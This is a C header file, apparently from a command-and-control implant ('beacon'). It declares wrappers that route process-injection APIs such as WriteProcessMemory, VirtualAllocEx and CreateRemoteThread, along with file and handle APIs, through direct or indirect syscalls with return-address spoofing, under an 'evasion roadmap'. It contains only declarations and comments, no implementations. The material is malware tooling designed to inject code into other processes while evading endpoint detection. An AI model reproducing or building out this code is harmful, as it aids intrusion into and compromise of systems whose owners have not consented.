#pragma once
#include <windows.h>

/* Phase 2 unified execution gate (docs/EVASION-ROADMAP.md section 13.2).
 * Win32-shaped wrappers honouring the operator's syscall_method setting:
 * 0 = plain API, 1 = direct syscall stub, 2 = indirect (ntdll gadget) with
 * the v2 return-address spoof. Fallback to the plain API whenever the
 * gate cannot resolve a stub. */
void syscalls_resolve(void);
int  syscalls_ssn_ntwrite(void);       /* test hook: 0 if unresolved */
int  syscalls_gate_ready_count(void);  /* test hook: resolved table size */
void syscalls_test_indirect_mode(int); /* test hook: bypass the indirect shelving */

BOOL   beacon_WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten);
BOOL   beacon_ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesRead);
BOOL   beacon_DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions);
LPVOID beacon_VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
BOOL   beacon_VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
BOOL   beacon_VirtualFreeEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
HANDLE beacon_CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES sa, SIZE_T stack, LPTHREAD_START_ROUTINE start, LPVOID param, DWORD flags, LPDWORD outId);

/* file/token family (round 22): NtOpenProcess/NtOpenThread/NtClose/NtReadFile/
 * NtWriteFile/NtCreateFile routed through the gate. Fallback = plain API. */
HANDLE beacon_OpenProcess(DWORD access, BOOL inherit, DWORD pid);
HANDLE beacon_OpenThread(DWORD access, BOOL inherit, DWORD tid);
BOOL   beacon_CloseHandle(HANDLE h);
BOOL   beacon_ReadFile(HANDLE h, LPVOID buf, DWORD toRead, LPDWORD got, LPOVERLAPPED ov);
BOOL   beacon_WriteFile(HANDLE h, LPCVOID buf, DWORD toWrite, LPDWORD wrote, LPOVERLAPPED ov);
HANDLE beacon_CreateFileA(LPCSTR name, DWORD access, DWORD share, LPSECURITY_ATTRIBUTES sa, DWORD disp, DWORD flags, HANDLE tmpl);
